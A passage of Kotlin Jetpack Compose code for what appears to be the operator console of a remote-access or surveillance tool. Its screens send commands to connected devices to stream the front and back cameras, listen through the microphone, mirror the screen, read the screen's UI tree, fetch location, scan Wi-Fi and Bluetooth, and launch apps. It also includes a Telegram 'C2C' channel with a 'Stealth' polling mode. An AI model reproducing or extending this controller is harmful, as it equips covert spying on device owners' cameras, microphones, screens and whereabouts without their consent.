                    AndroidView(factory = { WebView(it).apply { settings.javaScriptEnabled = true; loadUrl("https://maps.google.com/?q=26.1445,91.7362") } }, modifier = Modifier.weight(1f).fillMaxWidth())
                    Spacer(modifier = Modifier.height(16.dp))
                    Row(horizontalArrangement = Arrangement.SpaceEvenly, modifier = Modifier.fillMaxWidth()) {
                        TerminalButton("MAPS_EXT", Color.Green, Modifier.weight(1f)) { context.startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("geo:26.1445,91.7362"))) }
                        Spacer(modifier = Modifier.width(8.dp))
                        TerminalButton("CLOSE", CyberNeonPink, Modifier.weight(1f)) { showLocDialog = false }
                    }
                }
            }
        }
    }

    Column(modifier = Modifier.fillMaxSize().padding(8.dp)) {
        Card(modifier = Modifier.fillMaxWidth().border(1.dp, CyberNeonYellow, CyberShapes.small), colors = CardDefaults.cardColors(containerColor = CyberBlack)) {
            Column(modifier = Modifier.padding(8.dp)) {
                Row(horizontalArrangement = Arrangement.SpaceEvenly, modifier = Modifier.fillMaxWidth()) {
                    IconButton(onClick = { viewModel.executePush("flash", "toggle") }) { Icon(Icons.Default.FlashlightOn, "Flash", tint = CyberNeonYellow) }
                    IconButton(onClick = { viewModel.executePush("screen", "on") }) { Icon(Icons.Default.ScreenLockLandscape, "Scr On", tint = CyberNeonCyan) }
                    IconButton(onClick = { viewModel.executePush("screen", "off") }) { Icon(Icons.Default.ScreenLockPortrait, "Scr Off", tint = CyberNeonPink) }
                    IconButton(onClick = { showLocDialog = true; viewModel.executePush("loc") }) { Icon(Icons.Default.LocationOn, "Loc", tint = Color.Green) }
                    IconButton(onClick = { viewModel.executePush("info", "full"); Toast.makeText(context, "Requesting Intel...", Toast.LENGTH_SHORT).show() }) { Icon(Icons.Default.Info, "Info", tint = CyberNeonYellow) }
                }
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Icon(Icons.Default.VolumeUp, "Vol", tint = CyberWhite)
                    Slider(value = volLevel, onValueChange = { volLevel = it }, valueRange = 0f..100f, modifier = Modifier.weight(1f))
                    IconButton(onClick = { viewModel.executePush("vol", volLevel.toInt().toString()) }) { Icon(Icons.Default.Send, "Set Vol", tint = CyberNeonCyan) }
                }
                Button(onClick = { context.startActivity(Intent(context, FileManagerActivity::class.java)) }, modifier = Modifier.fillMaxWidth().padding(top = 4.dp), colors = ButtonDefaults.buttonColors(containerColor = CyberDarkGray, contentColor = CyberNeonCyan), shape = CyberShapes.small, border = BorderStroke(1.dp, CyberNeonCyan)) {
                    Icon(Icons.Default.FolderSpecial, null); Spacer(modifier = Modifier.width(8.dp)); Text("[ DUAL-PANE FILE MANAGER ]", fontFamily = CyberFont, fontWeight = FontWeight.Bold)
                }
            }
        }
        Spacer(modifier = Modifier.height(16.dp))
        Text("> SYSTEM_DIRECTIVES", color = CyberNeonCyan, fontFamily = CyberFont)
        Spacer(modifier = Modifier.height(8.dp))

        // Fixed clickable overlay issue with combinedClickable
        LazyVerticalGrid(columns = GridCells.Fixed(3), horizontalArrangement = Arrangement.spacedBy(12.dp), verticalArrangement = Arrangement.spacedBy(12.dp)) {
            items(viewModel.pushMessages) { msg ->
                Card(
                    shape = CyberShapes.small,
                    border = BorderStroke(1.dp, CyberNeonCyan),
                    colors = CardDefaults.cardColors(containerColor = CyberDarkGray),
                    modifier = Modifier.aspectRatio(1f).combinedClickable(
                        onClick = {
                            if (msg.requiresArg && msg.defaultArg.isBlank()) showArgPrompt = msg
                            else viewModel.executePush(msg.cmd, msg.defaultArg)
                        },
                        onLongClick = {
                            curIconMsgId = msg.id
                            photoPicker.launch(PickVisualMediaRequest(ActivityResultContracts.PickVisualMedia.ImageOnly))
                        }
                    )
                ) {
                    Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                        if (msg.iconUri != null) AsyncImage(model = msg.iconUri, contentDescription = null, contentScale = ContentScale.Crop, modifier = Modifier.fillMaxSize(), alpha = 0.6f)
                        else Text(msg.label.take(3).uppercase(), color = CyberNeonCyan, fontFamily = CyberFont, fontWeight = FontWeight.Bold, fontSize = 24.sp)
                        
                        Box(modifier = Modifier.align(Alignment.BottomCenter).fillMaxWidth().background(Color(0xBB000000)).padding(2.dp)) {
                            Text(msg.label, color = CyberWhite, fontFamily = CyberFont, fontSize = 9.sp, textAlign = TextAlign.Center, modifier = Modifier.fillMaxWidth())
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun SetupTab(viewModel: CyberViewModel) {
    var editUrl by remember { mutableStateOf(viewModel.serverUrl) }
    var editTopic by remember { mutableStateOf(viewModel.topic) }
    
    var newLabel by remember { mutableStateOf("") }
    var newCmd by remember { mutableStateOf("") }
    var newArg by remember { mutableStateOf("") }
    var reqArg by remember { mutableStateOf(false) }

    LazyColumn(modifier = Modifier.fillMaxSize().padding(16.dp)) {
        item {
            Text("> NETWORK_CONFIG", color = CyberNeonYellow, fontFamily = CyberFont)
            OutlinedTextField(value = editUrl, onValueChange = { editUrl = it }, label = { Text("Target URL") }, modifier = Modifier.fillMaxWidth())
            OutlinedTextField(value = editTopic, onValueChange = { editTopic = it }, label = { Text("Topic Channel") }, modifier = Modifier.fillMaxWidth())
            Spacer(modifier = Modifier.height(8.dp))
            TerminalButton("SAVE NETWORK", CyberNeonYellow) { viewModel.saveConfig(editUrl, editTopic) }
            
            Spacer(modifier = Modifier.height(32.dp))
            
            Text("> NEW_DIRECTIVE", color = CyberNeonPink, fontFamily = CyberFont)
            OutlinedTextField(value = newLabel, onValueChange = { newLabel = it }, label = { Text("Label (e.g. Wake Device)") }, modifier = Modifier.fillMaxWidth())
            OutlinedTextField(value = newCmd, onValueChange = { newCmd = it }, label = { Text("Command (e.g. live_start)") }, modifier = Modifier.fillMaxWidth())
            OutlinedTextField(value = newArg, onValueChange = { newArg = it }, label = { Text("Default Arg (Optional)") }, modifier = Modifier.fillMaxWidth())
            
            Row(verticalAlignment = Alignment.CenterVertically) { 
                Checkbox(checked = reqArg, onCheckedChange = { reqArg = it }, colors = CheckboxDefaults.colors(checkedColor = CyberNeonPink)) 
                Text("Require Custom Arg at Runtime", color = CyberWhite, fontFamily = CyberFont) 
            }
            Spacer(modifier = Modifier.height(8.dp))
            TerminalButton("SAVE DIRECTIVE", CyberNeonPink) { 
                if (newLabel.isNotBlank() && newCmd.isNotBlank()) { 
                    viewModel.saveNewCommand(newLabel, newCmd, newArg, reqArg)
                    newLabel = ""; newCmd = ""; newArg = ""; reqArg = false 
                } 
            }
        }
    }
}

@OptIn(ExperimentalFoundationApi::class)
@Composable
fun ServerTab(viewModel: CyberViewModel) {
    val context = LocalContext.current
    // Fixed bug: always maintaining pageCount = 2, using userScrollEnabled to lock/unlock
    val isConn = ServerCore.liveSessions.isNotEmpty()
    val pagerState = rememberPagerState(pageCount = { 2 }) 

    LaunchedEffect(isConn) {
        if (isConn) { delay(1000); pagerState.animateScrollToPage(1) }
        else pagerState.animateScrollToPage(0)
    }

    HorizontalPager(state = pagerState, userScrollEnabled = isConn, modifier = Modifier.fillMaxSize()) { page ->
        if (page == 0) TerminalPage(viewModel, context) else LiveControlPage(viewModel, context)
    }
}

@Composable
fun TerminalPage(viewModel: CyberViewModel, context: Context) {
    val clipboard = LocalClipboardManager.current
    val listState = rememberLazyListState()
    LaunchedEffect(viewModel.serverLogs.size) { if(viewModel.serverLogs.isNotEmpty()) listState.animateScrollToItem(viewModel.serverLogs.size - 1) }

    Column(modifier = Modifier.fillMaxSize().padding(16.dp)) {
        Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.fillMaxWidth()) {
            OutlinedTextField(value = viewModel.localServerPort, onValueChange = { viewModel.localServerPort = it }, label = { Text("Port", fontFamily = UbuntuInputFont) }, modifier = Modifier.weight(1f))
            Spacer(modifier = Modifier.width(16.dp))
            Button(onClick = { viewModel.toggleServer(context) }, shape = CyberShapes.small, colors = ButtonDefaults.buttonColors(containerColor = if (viewModel.isServerRunning) CyberNeonPink else CyberNeonYellow, contentColor = CyberBlack), modifier = Modifier.height(56.dp).padding(top = 8.dp)) {
                Text(if (viewModel.isServerRunning) "[ HALT ]" else "[ INIT ]", fontFamily = CyberFont, fontWeight = FontWeight.Bold)
            }
        }
        Spacer(modifier = Modifier.height(16.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
            Text("> NODE_TERMINAL_LOG:", color = CyberNeonYellow, fontFamily = CyberFont)
            Row {
                IconButton(onClick = { clipboard.setText(AnnotatedString(viewModel.serverLogs.joinToString("\n"))) }) { Icon(Icons.Default.ContentCopy, "Copy", tint = CyberNeonYellow) }
                IconButton(onClick = { viewModel.serverLogs.clear() }) { Icon(Icons.Default.DeleteSweep, "Clear", tint = CyberNeonPink) }
            }
        }
        Box(modifier = Modifier.fillMaxWidth().weight(1f).border(1.dp, CyberNeonYellow, CyberShapes.small).background(Color(0x99000000)).padding(8.dp)) {
            LazyColumn(state = listState) { items(viewModel.serverLogs) { log -> Text(parseLogColor(log), fontFamily = CyberFont, fontSize = 11.sp, lineHeight = 14.sp) } }
        }
    }
}

@Composable
fun LiveControlPage(viewModel: CyberViewModel, context: Context) {
    var showAppTray by remember { mutableStateOf(false) }
    var showAudioModal by remember { mutableStateOf(false) }
    var showScreenJson by remember { mutableStateOf(false) }
    var showScreenCast by remember { mutableStateOf(false) }

    if (showAppTray) AppTrayModal(viewModel) { showAppTray = false }
    if (showAudioModal) AudioControlModal(viewModel, context) { showAudioModal = false }
    if (showScreenJson) ScreenJsonModal(viewModel) { showScreenJson = false }
    if (showScreenCast) ScreenCastOverlay(viewModel) { showScreenCast = false }
    if (viewModel.showScanResultsModal) ScanResultsModal(viewModel) { viewModel.showScanResultsModal = false; viewModel.scanResults = emptyList() }

    Column(modifier = Modifier.fillMaxSize().padding(16.dp)) {
        Card(modifier = Modifier.fillMaxWidth().border(1.dp, if(viewModel.latestSlabTxt.contains("SUCCESS")) LogBrightGreen else if(viewModel.latestSlabTxt.contains("FAILURE")) LogMediumRed else CyberNeonCyan, CyberShapes.small), colors = CardDefaults.cardColors(containerColor = CyberBlack)) {
            Text("> ${viewModel.latestSlabTxt}", color = CyberWhite, fontFamily = CyberFont, fontSize = 12.sp, modifier = Modifier.padding(12.dp))
        }
        Spacer(modifier = Modifier.height(16.dp))
        
        Row(modifier = Modifier.fillMaxWidth().clip(CyberShapes.small).background(CyberDarkGray).border(1.dp, CyberWhite, CyberShapes.small).padding(vertical = 8.dp), horizontalArrangement = Arrangement.SpaceEvenly) {
            IconButton(onClick = { viewModel.sendLive("btn_back") }) { Icon(Icons.Default.ArrowBack, "Back", tint = CyberWhite) }
            IconButton(onClick = { viewModel.sendLive("btn_home") }) { Icon(Icons.Default.Home, "Home", tint = CyberWhite) }
            IconButton(onClick = { viewModel.sendLive("btn_recents") }) { Icon(Icons.Default.Menu, "Recents", tint = CyberWhite) }
        }
        Spacer(modifier = Modifier.height(16.dp))

        Text("> STREAMS_AND_MEDIA", color = CyberNeonYellow, fontFamily = CyberFont)
        Spacer(modifier = Modifier.height(8.dp))
        LazyVerticalGrid(columns = GridCells.Fixed(2), horizontalArrangement = Arrangement.spacedBy(8.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
            item { TerminalButton("Audio Hub", CyberNeonCyan) { showAudioModal = true } }
            item { TerminalButton("Screen Cast", CyberNeonPink) { showScreenCast = true; viewModel.sendLive("live_screen_cast", "start") } }
            item { TerminalButton("Cam Front", CyberWhite) { viewModel.sendLive("stream_cam_front", "start") } }
            item { TerminalButton("Cam Back", CyberWhite) { viewModel.sendLive("stream_cam_back", "start") } }
        }
        Spacer(modifier = Modifier.height(16.dp))

        Text("> CONNECTIVITY", color = CyberNeonYellow, fontFamily = CyberFont)
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            TerminalButton("WIFI", CyberNeonYellow, Modifier.weight(1f)) { viewModel.sendLive("wifi_toggle") }
            TerminalButton("BT", CyberNeonYellow, Modifier.weight(1f)) { viewModel.sendLive("bt_toggle") }
            TerminalButton("Hotspot", CyberNeonYellow, Modifier.weight(1f)) { viewModel.sendLive("hotspot_toggle") }
        }
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            TerminalButton("Scan WIFI", CyberNeonYellow, Modifier.weight(1f)) { viewModel.scanResults = emptyList(); viewModel.sendLive("wifi_scan") }
            TerminalButton("Scan BT", CyberNeonYellow, Modifier.weight(1f)) { viewModel.scanResults = emptyList(); viewModel.sendLive("bt_scan") }
        }
        Spacer(modifier = Modifier.height(16.dp))

        Text("> SYSTEM_DATA", color = CyberNeonYellow, fontFamily = CyberFont)
        Spacer(modifier = Modifier.height(8.dp))
        LazyVerticalGrid(columns = GridCells.Fixed(2), horizontalArrangement = Arrangement.spacedBy(8.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
            item { TerminalButton("Launch Apps", CyberWhite) { showAppTray = true } }
            item { TerminalButton("UI JSON Map", CyberWhite) { showScreenJson = true; viewModel.sendLive("stream_screen_start") } }
            item { TerminalButton("Stream Sensors", CyberWhite) { viewModel.sendLive("stream_sensors", "start") } }
            item { TerminalButton("Vibrate", CyberWhite) { viewModel.sendLive("vibrate", "1000") } }
        }
    }
}

@Composable
fun ScanResultsModal(viewModel: CyberViewModel, onDismiss: () -> Unit) {
    Dialog(onDismissRequest = onDismiss, properties = DialogProperties(usePlatformDefaultWidth = false)) {
        Card(modifier = Modifier.fillMaxWidth(0.9f).fillMaxHeight(0.7f), colors = CardDefaults.cardColors(containerColor = CyberBlack), border = BorderStroke(1.dp, CyberNeonCyan)) {
            Column(modifier = Modifier.padding(16.dp)) {
                Text("[ ${viewModel.currentScanType.uppercase()} SCAN RESULTS ]", color = CyberNeonCyan, fontFamily = CyberFont, fontWeight = FontWeight.Bold, fontSize = 18.sp)
                Spacer(modifier = Modifier.height(8.dp))
                LazyColumn(modifier = Modifier.weight(1f).border(1.dp, CyberDarkGray).padding(8.dp)) {
                    if (viewModel.scanResults.isEmpty()) {
                        item { Text("No results found or still scanning...", color = Color.Gray, fontFamily = CyberFont) }
                    } else {
                        items(viewModel.scanResults) { result ->
                            Row(modifier = Modifier.fillMaxWidth().padding(vertical = 4.dp), verticalAlignment = Alignment.CenterVertically) {
                                Icon(if(viewModel.currentScanType == "WIFI") Icons.Default.Wifi else Icons.Default.Bluetooth, null, tint = CyberNeonYellow, modifier = Modifier.size(24.dp))
                                Spacer(modifier = Modifier.width(8.dp))
                                Column {
                                    Text(result.first, color = CyberWhite, fontFamily = UbuntuInputFont, fontWeight = FontWeight.Bold)
                                    Text(result.second, color = Color.Gray, fontFamily = CyberFont, fontSize = 10.sp)
                                }
                            }
                        }
                    }
                }
                TerminalButton("CLOSE SCAN", CyberNeonPink, Modifier.padding(top=8.dp)) { onDismiss() }
            }
        }
    }
}

@Composable
fun AppTrayModal(viewModel: CyberViewModel, onDismiss: () -> Unit) {
    var showAddApp by remember { mutableStateOf(false) }
    Dialog(onDismissRequest = onDismiss, properties = DialogProperties(usePlatformDefaultWidth = false)) {
        Card(modifier = Modifier.fillMaxWidth(0.9f).fillMaxHeight(0.8f), border = BorderStroke(1.dp, CyberNeonCyan), colors = CardDefaults.cardColors(containerColor = CyberDarkGray)) {
            if (showAddApp) {
                var n by remember { mutableStateOf("") }; var p by remember { mutableStateOf("") }; var u by remember { mutableStateOf<String?>(null) }
                val picker = rememberLauncherForActivityResult(ActivityResultContracts.PickVisualMedia()) { uri -> u = uri?.toString() }
                Column(modifier = Modifier.padding(16.dp)) {
                    Text("[ ADD APP LINK ]", color = CyberNeonCyan, fontFamily = CyberFont); Spacer(modifier = Modifier.height(8.dp))
                    OutlinedTextField(value = n, onValueChange = { n = it }, label = { Text("App Name") })
                    OutlinedTextField(value = p, onValueChange = { p = it }, label = { Text("Package Name") })
                    Spacer(modifier = Modifier.height(8.dp))
                    TerminalButton("PICK ICON", CyberWhite) { picker.launch(PickVisualMediaRequest(ActivityResultContracts.PickVisualMedia.ImageOnly)) }
                    Spacer(modifier = Modifier.height(16.dp))
                    TerminalButton("SAVE LINK", CyberNeonCyan) { viewModel.addLiveApp(n, p, u); showAddApp = false }
                }
            } else {
                Column(modifier = Modifier.fillMaxSize().padding(16.dp)) {
                    Text("[ REMOTE APP TRAY ]", color = CyberNeonCyan, fontFamily = CyberFont, fontWeight = FontWeight.Bold, fontSize = 18.sp)
                    Spacer(modifier = Modifier.height(16.dp))
                    LazyVerticalGrid(columns = GridCells.Fixed(3), modifier = Modifier.weight(1f)) {
                        items(viewModel.liveAppsList) { app ->
                            Column(horizontalAlignment = Alignment.CenterHorizontally, modifier = Modifier.clickable { viewModel.sendLive("launch_app", app.packageName); onDismiss() }.padding(8.dp)) {
                                Box(modifier = Modifier.size(56.dp).clip(CircleShape).border(1.dp, CyberNeonCyan, CircleShape).background(Color.DarkGray), contentAlignment = Alignment.Center) {
                                    if (app.iconUri != null) AsyncImage(app.iconUri, null, contentScale = ContentScale.Crop)
                                    else Icon(Icons.Default.Android, null, tint = Color.Green)
                                }
                                Text(app.name, color = CyberWhite, fontSize = 10.sp, maxLines = 1, fontFamily = CyberFont)
                            }
                        }
                        item {
                            Column(horizontalAlignment = Alignment.CenterHorizontally, modifier = Modifier.clickable { showAddApp = true }.padding(8.dp)) {
                                Box(modifier = Modifier.size(56.dp).clip(CircleShape).border(1.dp, CyberNeonPink, CircleShape).background(CyberBlack), contentAlignment = Alignment.Center) { Icon(Icons.Default.Add, null, tint = CyberNeonPink) }
                                Text("Add", color = CyberWhite, fontSize = 10.sp, fontFamily = CyberFont)
                            }
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun AudioControlModal(viewModel: CyberViewModel, context: Context, onDismiss: () -> Unit) {
    // This allows uploading an MP3 to play remotely
    val filePicker = rememberLauncherForActivityResult(ActivityResultContracts.GetContent()) { uri ->
        if (uri != null) {
            viewModel.viewModelScope.launch(Dispatchers.IO) {
                val bytes = context.contentResolver.openInputStream(uri)?.readBytes()
                if (bytes != null) ServerCore.liveSessions.forEach { it.send(Frame.Binary(true, bytes)) }
            }
        }
    }
    Dialog(onDismissRequest = onDismiss) {
        Card(colors = CardDefaults.cardColors(containerColor = CyberDarkGray), border = BorderStroke(1.dp, CyberNeonYellow)) {
            Column(modifier = Modifier.padding(16.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                Text("[ AUDIO / CALL HUB ]", color = CyberNeonYellow, fontFamily = CyberFont, fontWeight = FontWeight.Bold)
                Spacer(modifier = Modifier.height(16.dp))
                Row(horizontalArrangement = Arrangement.SpaceEvenly, modifier = Modifier.fillMaxWidth()) {
                    TerminalButton("FULL CALL", CyberNeonCyan, Modifier.weight(1f)) { viewModel.sendLive("live_audio_mode", "call"); viewModel.startMic() }
                    Spacer(modifier = Modifier.width(8.dp))
                    TerminalButton("LISTEN ONLY", CyberNeonCyan, Modifier.weight(1f)) { viewModel.sendLive("live_audio_mode", "mic") }
                }
                Spacer(modifier = Modifier.height(8.dp))
                Row(horizontalArrangement = Arrangement.SpaceEvenly, modifier = Modifier.fillMaxWidth()) {
                    TerminalButton("SYS AUDIO", CyberWhite, Modifier.weight(1f)) { viewModel.sendLive("live_audio_mode", "media") }
                    Spacer(modifier = Modifier.width(8.dp))
                    TerminalButton("PLAY MP3", CyberWhite, Modifier.weight(1f)) { viewModel.sendLive("live_audio_mode", "play"); filePicker.launch("audio/*") }
                }
                Spacer(modifier = Modifier.height(16.dp))
                TerminalButton("END AUDIO", LogMediumRed) { viewModel.sendLive("live_audio_mode", "off"); viewModel.stopMic(); onDismiss() }
            }
        }
    }
}

@Composable
fun ScreenJsonModal(viewModel: CyberViewModel, onDismiss: () -> Unit) {
    Dialog(onDismissRequest = { viewModel.sendLive("stream_screen_stop"); onDismiss() }, properties = DialogProperties(usePlatformDefaultWidth = false)) {
        Card(modifier = Modifier.fillMaxWidth(0.9f).fillMaxHeight(0.9f), border = BorderStroke(1.dp, CyberNeonCyan), colors = CardDefaults.cardColors(containerColor = CyberBlack)) {
            Column(modifier = Modifier.padding(16.dp)) {
                Text("> LIVE_UI_RENDER_MAP (JSON)", color = CyberNeonCyan, fontFamily = CyberFont)
                Spacer(modifier = Modifier.height(8.dp))
                if (viewModel.liveScreenJsonData.isEmpty()) CircularProgressIndicator(color = CyberNeonCyan)
                else {
                    LazyColumn(modifier = Modifier.weight(1f).border(1.dp, CyberDarkGray).padding(8.dp)) {
                        item { Text(viewModel.liveScreenJsonData, color = CyberNeonYellow, fontFamily = CyberFont, fontSize = 10.sp) }
                    }
                }
                TerminalButton("STOP STREAM", CyberNeonPink, Modifier.padding(top=8.dp)) { viewModel.sendLive("stream_screen_stop"); onDismiss() }
            }
        }
    }
}

@Composable
fun ScreenCastOverlay(viewModel: CyberViewModel, onDismiss: () -> Unit) {
    var offsetX by remember { mutableFloatStateOf(0f) }
    var offsetY by remember { mutableFloatStateOf(0f) }
    var isFullScreen by remember { mutableStateOf(false) }

    Dialog(onDismissRequest = { viewModel.sendLive("live_screen_cast", "stop"); onDismiss() }, properties = DialogProperties(usePlatformDefaultWidth = false, decorFitsSystemWindows = false)) {
        Box(modifier = Modifier.fillMaxSize()) {
            Card(modifier = Modifier.offset { IntOffset(offsetX.roundToInt(), offsetY.roundToInt()) }.then(if(isFullScreen) Modifier.fillMaxSize() else Modifier.size(240.dp, 400.dp)).pointerInput(Unit) {
                    detectDragGestures { change, dragAmount -> change.consume(); offsetX += dragAmount.x; offsetY += dragAmount.y }
                }, colors = CardDefaults.cardColors(containerColor = CyberBlack), shape = if(isFullScreen) CutCornerShape(0.dp) else CyberShapes.small, border = BorderStroke(2.dp, CyberNeonCyan)) {
                Box(modifier = Modifier.fillMaxSize()) {
                    if (viewModel.liveScreenFrame == null) CircularProgressIndicator(color = CyberNeonCyan, modifier = Modifier.align(Alignment.Center))
                    else {
                        val bmp = BitmapFactory.decodeByteArray(viewModel.liveScreenFrame, 0, viewModel.liveScreenFrame!!.size)
                        if (bmp != null) Image(bitmap = bmp.asImageBitmap(), contentDescription = "Cast", modifier = Modifier.fillMaxSize(), contentScale = ContentScale.Fit)
                    }
                    Row(modifier = Modifier.align(Alignment.TopEnd).padding(4.dp)) {
                        IconButton(onClick = { isFullScreen = !isFullScreen }) { Icon(if(isFullScreen) Icons.Default.FullscreenExit else Icons.Default.Fullscreen, "Size", tint = CyberWhite) }
                        IconButton(onClick = { viewModel.sendLive("live_screen_cast", "stop"); onDismiss() }) { Icon(Icons.Default.Close, "Close", tint = CyberNeonPink) }
                    }
                }
            }
        }
    }
}

@OptIn(ExperimentalMaterial3Api::class) 
@Composable
fun TelegramTab(viewModel: CyberViewModel) {
    if (!viewModel.isTgLoggedIn) {
        var token by remember { mutableStateOf("") }; var chatId by remember { mutableStateOf("") }
        Column(modifier = Modifier.fillMaxSize().padding(24.dp), verticalArrangement = Arrangement.Center, horizontalAlignment = Alignment.CenterHorizontally) {
            Icon(Icons.Default.ChatBubbleOutline, "TG", tint = Color.White, modifier = Modifier.size(72.dp))
            Text("TG_SEC_LINK", fontSize = 32.sp, fontFamily = CyberFont, color = Color.White, fontWeight = FontWeight.Bold)
            Spacer(modifier = Modifier.height(32.dp))
            OutlinedTextField(value = token, onValueChange = { token = it }, label = { Text("Bot Token", fontFamily = UbuntuInputFont) }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = Color.White, focusedLabelColor = Color.White))
            Spacer(modifier = Modifier.height(16.dp))
            OutlinedTextField(value = chatId, onValueChange = { chatId = it }, label = { Text("Target Chat ID", fontFamily = UbuntuInputFont) }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = Color.White, focusedLabelColor = Color.White))
            Spacer(modifier = Modifier.height(24.dp))
            TerminalButton("CONNECT SEC_COMMS", Color.White) { viewModel.loginTelegram(token, chatId) }
        }
    } else {
        var inputTxt by remember { mutableStateOf("") }
        val listState = rememberLazyListState()
        var showMenu by remember { mutableStateOf(false) }
        var showSpeedDialog by remember { mutableStateOf(false) }
        
        LaunchedEffect(viewModel.tgMessages.size) { if(viewModel.tgMessages.isNotEmpty()) listState.animateScrollToItem(viewModel.tgMessages.size - 1) }
        
        if (showSpeedDialog) {
            AlertDialog(onDismissRequest = { showSpeedDialog = false }, title = { Text("[ POLLING SPEED ]", fontFamily = CyberFont, color = CyberWhite) }, containerColor = CyberDarkGray, text = {
                Column {
                    listOf("Aggressive (2s)" to 2000L, "Standard (5s)" to 5000L, "Stealth (15s)" to 15000L).forEach { (label, delayMs) ->
                        TextButton(onClick = { viewModel.setPollingSpeed(delayMs); showSpeedDialog = false }) { Text("> $label ${if (viewModel.tgPollingDelay == delayMs) "(Active)" else ""}", color = CyberNeonCyan, fontFamily = CyberFont) }
                    }
                }
            }, confirmButton = { TextButton(onClick = { showSpeedDialog = false }) { Text("CLOSE", color = CyberNeonPink, fontFamily = CyberFont) } })
        }

        Column(modifier = Modifier.fillMaxSize()) {
            TopAppBar(title = { Text("C2C_SECURE_COMMS", fontFamily = CyberFont, color = CyberBlack) }, colors = TopAppBarDefaults.topAppBarColors(containerColor = Color.White), actions = {
                Box {
                    IconButton(onClick = { showMenu = true }) { Icon(Icons.Default.MoreVert, "Menu", tint = CyberBlack) }
                    DropdownMenu(expanded = showMenu, onDismissRequest = { showMenu = false }, modifier = Modifier.background(CyberDarkGray)) {
                        DropdownMenuItem(text = { Text(if (viewModel.isTgPollingActive) "Pause Polling" else "Resume Polling", color = CyberWhite, fontFamily = CyberFont) }, onClick = { viewModel.togglePolling(); showMenu = false })
                        DropdownMenuItem(text = { Text("Polling Speed", color = CyberNeonCyan, fontFamily = CyberFont) }, onClick = { showSpeedDialog = true; showMenu = false })
                        DropdownMenuItem(text = { Text("Dump Chats to Disk", color = CyberWhite, fontFamily = CyberFont) }, onClick = { viewModel.dumpChats(); showMenu = false })
                        DropdownMenuItem(text = { Text("Clear Local View", color = CyberWhite, fontFamily = CyberFont) }, onClick = { viewModel.tgMessages.clear(); showMenu = false })
                        DropdownMenuItem(text = { Text("Sever Link (Logout)", color = CyberNeonPink, fontFamily = CyberFont) }, onClick = { viewModel.logoutTelegram(); showMenu = false })
                    }
                }
            })
            LazyColumn(state = listState, modifier = Modifier.weight(1f).padding(8.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
                items(viewModel.tgMessages) { msg ->
                    Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = if (msg.isMe) Arrangement.End else Arrangement.Start) {
                        Card(shape = CyberShapes.small, colors = CardDefaults.cardColors(containerColor = if (msg.isMe) CyberNeonCyan else CyberDarkGray), border = BorderStroke(1.dp, if(msg.isMe) Color.Transparent else CyberNeonCyan), modifier = Modifier.widthIn(max = 280.dp)) {
                            Column(modifier = Modifier.padding(8.dp)) {
                                if (msg.photoId != null) {
                                    var imageUrl by remember { mutableStateOf<String?>(null) }
                                    if (imageUrl == null) TerminalButton("FETCH INTEL_IMAGE", CyberNeonPink) { viewModel.getTelegramFileUrl(msg.photoId) { url -> imageUrl = url } }
                                    else AsyncImage(model = imageUrl, contentDescription = "Photo", modifier = Modifier.fillMaxWidth().height(200.dp))
                                }
                                if (msg.text.isNotBlank()) Text(msg.text, color = if(msg.isMe) CyberBlack else CyberWhite, fontFamily = UbuntuInputFont)
                            }
                        }
                    }
                }
            }
            Row(modifier = Modifier.fillMaxWidth().padding(8.dp), verticalAlignment = Alignment.CenterVertically) {
                OutlinedTextField(value = inputTxt, onValueChange = { inputTxt = it }, modifier = Modifier.weight(1f), placeholder = { Text("Secure transmit...", fontFamily = UbuntuInputFont) }, textStyle = LocalTextStyle.current.copy(fontFamily = UbuntuInputFont))
                Spacer(modifier = Modifier.width(8.dp))
                FloatingActionButton(onClick = { if (inputTxt.isNotBlank()) { viewModel.sendTelegramMessage(inputTxt); inputTxt = "" } }, containerColor = Color.White, contentColor = CyberBlack, shape = CyberShapes.small) { Icon(Icons.Default.Send, "Send") }
            }
        }
    }
}